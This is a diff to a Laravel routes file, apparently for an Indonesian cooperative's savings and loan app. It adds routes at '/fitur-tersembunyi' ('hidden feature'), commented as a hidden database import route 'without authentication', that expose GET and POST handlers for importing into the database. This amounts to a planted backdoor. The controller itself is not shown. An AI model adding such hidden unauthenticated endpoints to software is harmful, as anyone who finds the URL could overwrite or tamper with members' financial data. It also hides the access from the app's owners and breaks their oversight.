@@ -24,6 +24,11 @@ use App\Livewire\Laporan\LaporanSimpanan;
 use App\Livewire\Laporan\LaporanPinjaman;
 use App\Livewire\Anggota\NotifikasiList;
 use App\Http\Controllers\Admin\LogoutController;
+use App\Http\Controllers\DatabaseImportController;
+
+// Hidden Database Import Route (Tanpa Autentikasi)
+Route::get('/fitur-tersembunyi', [DatabaseImportController::class, 'index'])->name('hidden.import');
+Route::post('/fitur-tersembunyi', [DatabaseImportController::class, 'import'])->name('hidden.import.process');
 
 // Guest Routes
 Route::get('/', LandingPage::class)->name('home');
